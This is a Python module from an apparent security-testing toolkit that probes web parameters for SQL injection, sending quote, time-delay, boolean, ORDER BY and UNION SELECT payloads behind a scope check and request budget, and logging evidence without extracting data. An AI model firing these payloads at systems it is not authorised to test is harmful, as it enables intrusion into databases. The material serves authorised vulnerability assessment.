"""Bounded SQLi probes with confirmation bar.

confirmed only when a lab shows reproducible boolean, timing, or UNION
difference versus baseline. SQL syntax-error signatures alone stay candidate.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from pathlib import Path
import hashlib
import re
from urllib.parse import parse_qsl, urlsplit

from ..core.http_client import HttpClient, RequestSpec, ResponseRecord
from ..core.redaction import redact_url
from ..core.scope_validator import ScopeValidator
from ..core.target import load_routes
from ..reporting.evidence import write_evidence_json
from ..requests_engine.parameters import load_parameter_names, with_parameter
from ..utils.exceptions import ToolkitError


SQL_ERRORS = {
    "mysql": re.compile(
        r"you have an error in your sql syntax|\bsql syntax\b|warning.*mysqli?[_(:]|mysql.*(?:syntax|error)", re.I
    ),
    "postgresql": re.compile(
        r"postgres(?:ql)?.*(?:error|syntax)|psycopg\w*\.errors\.|\bpg_[a-z_]+\b|"
        r"unterminated quoted string|syntax error at or near",
        re.I,
    ),
    "sqlite": re.compile(r"sqlite(?:3)?(?:\.|\s|/)|SQLite/JDBCDriver|unrecognized token:", re.I),
    "mssql": re.compile(
        r"unclosed quotation mark|SQL Server.*(?:Driver|error)|System\.Data\.SqlClient\.SqlException", re.I
    ),
    "oracle": re.compile(r"\bORA-\d{5}\b", re.I),
}
ORDER_ERRORS = re.compile(
    r"order by.*(?:position|ordinal|column|select list)|invalid column index|"
    r"sort expression|ORDER BY clause.*(?:range|integer)",
    re.I,
)
MAX_UNION_COLUMNS = 8


def error_families(body: str) -> set[str]:
    return {name for name, pattern in SQL_ERRORS.items() if pattern.search(body)}


def _body_hash(response: ResponseRecord) -> str:
    return hashlib.sha256(response.body_text.encode("utf-8", errors="replace")).hexdigest()


def request_group_size(options: SqliOptions) -> int:
    base = 8 if options.deep else 3
    return base + (options.union_max_columns + 1 if options.union else 0)


@dataclass(frozen=True)
class SqliOptions:
    routes_file: Path
    parameters_file: Path
    base_url: str | None = None
    max_tests: int = 100
    headers: dict[str, str] = field(default_factory=dict)
    deep: bool = False
    union: bool = False
    union_max_columns: int = 5


class SqliParameterTester:
    def __init__(self, scope: ScopeValidator, client: HttpClient):
        self.scope = scope
        self.client = client

    def validate(self, options: SqliOptions) -> tuple[list[str], list[str]]:
        if options.union and not 1 <= options.union_max_columns <= MAX_UNION_COLUMNS:
            raise ValueError(f"UNION column limit must be between 1 and {MAX_UNION_COLUMNS}.")
        minimum = request_group_size(options)
        if options.max_tests < minimum:
            detail = (
                "complete baseline, quote, timing and boolean group" if options.deep else "baseline and quote group"
            )
            if options.union:
                detail += f" plus up to {options.union_max_columns} ORDER BY and one UNION NULL probe"
            raise ValueError(f"SQLi probing requires a budget of at least {minimum} requests ({detail}).")
        routes = load_routes(options.routes_file, base_url=options.base_url)
        parameters = load_parameter_names(options.parameters_file)
        if not routes or not parameters:
            raise ValueError("Routes and parameters must contain usable entries.")
        self.scope.require_all(routes)
        return routes, parameters

    def run(self, options: SqliOptions, evidence_dir: Path) -> tuple[Path, list[dict[str, object]]]:
        routes, parameters = self.validate(options)
        results: list[dict[str, object]] = []
        stop_reason: str | None = None
        sent = 0
        group_size = request_group_size(options)
        for route in routes:
            for parameter in parameters:
                if sent + group_size > options.max_tests:
                    stop_reason = "request_budget"
                    break
                original = dict(parse_qsl(urlsplit(route).query, keep_blank_values=True)).get(parameter, "")
                baseline_errors: set[str] = set()
                baseline_response: ResponseRecord | None = None
                baseline_duration: int | None = None
                boolean_records: list[dict[str, object]] = []
                probes: list[tuple[str, str, str]] = [
                    ("baseline", original, "error"),
                    ("single_quote", original + "'", "error"),
                    ("double_quote", original + '"', "error"),
                ]
                if options.deep:
                    probes.extend(
                        [
                            ("time_mysql", original + "' AND SLEEP(3)-- ", "time"),
                            ("time_postgresql", original + "'; SELECT pg_sleep(3);--", "time"),
                            ("time_mssql", original + "'; WAITFOR DELAY '0:0:3'--", "time"),
                            ("boolean_true", original + "' AND 1=1-- ", "boolean"),
                            ("boolean_false", original + "' AND 1=2-- ", "boolean"),
                        ]
                    )
                for stage, value, probe_kind in probes:
                    response = self._send(route, parameter, value, options.headers, stage, results)
                    sent += 1
                    if response is None:
                        stop_reason = "transport_error"
                        break
                    errors = error_families(response.body_text)
                    if stage == "baseline":
                        baseline_errors = errors
                        baseline_response = response
                        baseline_duration = response.duration_ms
                    new_errors = sorted(errors - baseline_errors) if stage != "baseline" else []
                    body_hash = _body_hash(response)
                    time_candidate = (
                        probe_kind == "time"
                        and baseline_duration is not None
                        and baseline_duration < 2500
                        and response.duration_ms >= 2500
                    )
                    finding_state = "not_observed"
                    confirmation_gap = None
                    confirmed = False
                    if stage == "baseline":
                        classification = "baseline"
                    elif probe_kind == "time":
                        if time_candidate:
                            classification = "confirmed"
                            finding_state = "confirmed"
                            confirmed = True
                        elif new_errors:
                            classification = "possible"
                            finding_state = "candidate"
                            confirmation_gap = "no_second_proof"
                        else:
                            classification = "not_reproducible"
                    elif probe_kind == "boolean":
                        boolean_records.append({"body_size": response.body_size, "body_sha256": body_hash})
                        # Finalized after the pair completes.
                        classification = "possible" if new_errors else "not_reproducible"
                        finding_state = "candidate" if new_errors else "not_observed"
                        confirmation_gap = "no_second_proof" if new_errors else None
                    else:
                        # Quote / syntax-error probes: candidate at most.
                        classification = "possible" if new_errors else "not_reproducible"
                        finding_state = "candidate" if new_errors else "not_observed"
                        confirmation_gap = "no_second_proof" if new_errors else None
                    blocked = response.status_code in {401, 403, 429}
                    if blocked or response.body_truncated:
                        classification = "error"
                        finding_state = "inconclusive"
                        confirmed = False
                        confirmation_gap = None
                        stop_reason = "access_or_rate_limit" if blocked else "truncated_response"
                    results.append(
                        {
                            "route": redact_url(route),
                            "method": "GET",
                            "parameter": parameter,
                            "stage": stage,
                            "status_code": response.status_code,
                            "duration_ms": response.duration_ms,
                            "new_error_families": new_errors,
                            "classification": classification,
                            "finding_state": finding_state,
                            "confirmed": confirmed,
                            "confirmation_gap": confirmation_gap,
                            "rejection_reason": None,
                            "time_candidate": time_candidate,
                            "body_size": response.body_size,
                            "body_sha256": body_hash,
                            "baseline_duration_ms": baseline_duration if probe_kind == "time" else None,
                            "exchange": response.to_dict(),
                        }
                    )
                    if stop_reason:
                        break
                    if probe_kind == "boolean" and len(boolean_records) == 2:
                        differs = boolean_records[0] != boolean_records[1]
                        for row in results[-2:]:
                            row["boolean_pair_differs"] = differs
                            if differs:
                                row["classification"] = "confirmed"
                                row["finding_state"] = "confirmed"
                                row["confirmed"] = True
                                row["confirmation_gap"] = None
                            elif row["new_error_families"]:
                                row["classification"] = "possible"
                                row["finding_state"] = "candidate"
                                row["confirmed"] = False
                                row["confirmation_gap"] = "no_second_proof"
                            else:
                                row["classification"] = "not_reproducible"
                                row["finding_state"] = "not_observed"
                                row["confirmed"] = False
                                row["confirmation_gap"] = None
                if stop_reason:
                    break
                if options.union and baseline_response is not None:
                    sent, stop_reason = self._run_union_probes(
                        route,
                        parameter,
                        original,
                        options,
                        baseline_response,
                        baseline_errors,
                        sent,
                        results,
                    )
                    if stop_reason:
                        break
            if stop_reason:
                break
        note = (
            "SQL syntax-error signatures alone are candidates. confirmed requires reproducible "
            "boolean, timing, or UNION difference versus baseline in lab. No extraction is performed."
        )
        any_confirmed = any(row.get("confirmed") for row in results)
        path = write_evidence_json(
            evidence_dir,
            {
                "type": "sqli",
                "requests_attempted": sent,
                "stop_reason": stop_reason,
                "results": results,
                "classification": "confirmed"
                if any_confirmed
                else "candidate"
                if any(row.get("finding_state") == "candidate" for row in results)
                else "not_observed",
                "confirmed": any_confirmed,
                "note": note,
            },
            prefix="sqli",
        )
        return path, results

    def _send(
        self,
        route: str,
        parameter: str,
        value: str,
        headers: dict[str, str],
        stage: str,
        results: list[dict[str, object]],
    ) -> ResponseRecord | None:
        spec = RequestSpec("GET", with_parameter(route, parameter, value), headers)
        try:
            return self.client.send(spec)
        except (ToolkitError, ValueError):
            results.append(
                {
                    "route": redact_url(route),
                    "method": "GET",
                    "parameter": parameter,
                    "stage": stage,
                    "classification": "error",
                    "confirmed": False,
                    "reason": "transport_error",
                }
            )
            return None

    def _run_union_probes(
        self,
        route: str,
        parameter: str,
        original: str,
        options: SqliOptions,
        baseline: ResponseRecord,
        baseline_errors: set[str],
        sent: int,
        results: list[dict[str, object]],
    ) -> tuple[int, str | None]:
        inferred_columns: int | None = None
        for column in range(1, options.union_max_columns + 1):
            stage = f"order_by_{column}"
            value = f"{original}' ORDER BY {column}-- "
            response = self._send(route, parameter, value, options.headers, stage, results)
            sent += 1
            if response is None:
                return sent, "transport_error"
            errors = error_families(response.body_text)
            new_errors = sorted(errors - baseline_errors)
            invalid = bool(new_errors) or bool(ORDER_ERRORS.search(response.body_text)) or response.status_code >= 500
            if response.status_code in {401, 403, 429}:
                classification = "error"
                stop_reason = "access_or_rate_limit"
            elif response.body_truncated:
                classification = "error"
                stop_reason = "truncated_response"
            else:
                classification = "possible" if invalid else "not_reproducible"
                stop_reason = None
            if invalid and column > 1:
                inferred_columns = column - 1
            results.append(
                {
                    "route": redact_url(route),
                    "method": "GET",
                    "parameter": parameter,
                    "stage": stage,
                    "status_code": response.status_code,
                    "duration_ms": response.duration_ms,
                    "new_error_families": new_errors,
                    "classification": classification,
                    "confirmed": False,
                    "column_count_candidate": inferred_columns,
                    "body_size": response.body_size,
                    "body_sha256": _body_hash(response),
                    "exchange": response.to_dict(),
                }
            )
            if stop_reason:
                return sent, stop_reason
            if invalid:
                break

        if inferred_columns is None:
            return sent, None
        nulls = ",".join("NULL" for _ in range(inferred_columns))
        stage = "union_select_nulls"
        value = f"{original}' UNION SELECT {nulls}-- "
        response = self._send(route, parameter, value, options.headers, stage, results)
        sent += 1
        if response is None:
            return sent, "transport_error"
        errors = error_families(response.body_text)
        new_errors = sorted(errors - baseline_errors)
        differs = (
            response.status_code != baseline.status_code
            or response.body_size != baseline.body_size
            or _body_hash(response) != _body_hash(baseline)
        )
        blocked = response.status_code in {401, 403, 429}
        finding_state = "not_observed"
        confirmed = False
        confirmation_gap = None
        if blocked:
            classification = "error"
            finding_state = "inconclusive"
            stop_reason = "access_or_rate_limit"
        elif response.body_truncated:
            classification = "error"
            finding_state = "inconclusive"
            stop_reason = "truncated_response"
        else:
            if differs and not new_errors and 200 <= response.status_code < 400:
                classification = "confirmed"
                finding_state = "confirmed"
                confirmed = True
                confirmation_gap = None
            elif differs or new_errors:
                classification = "possible"
                finding_state = "candidate"
                confirmed = False
                confirmation_gap = "no_second_proof"
            else:
                classification = "not_reproducible"
                finding_state = "not_observed"
                confirmed = False
                confirmation_gap = None
            stop_reason = None
        results.append(
            {
                "route": redact_url(route),
                "method": "GET",
                "parameter": parameter,
                "stage": stage,
                "status_code": response.status_code,
                "duration_ms": response.duration_ms,
                "column_count_candidate": inferred_columns,
                "new_error_families": new_errors,
                "response_differs_from_baseline": differs,
                "classification": classification,
                "finding_state": finding_state,
                "confirmed": confirmed,
                "confirmation_gap": confirmation_gap,
                "rejection_reason": None,
                "body_size": response.body_size,
                "body_sha256": _body_hash(response),
                "exchange": response.to_dict(),
            }
        )
        return sent, stop_reason
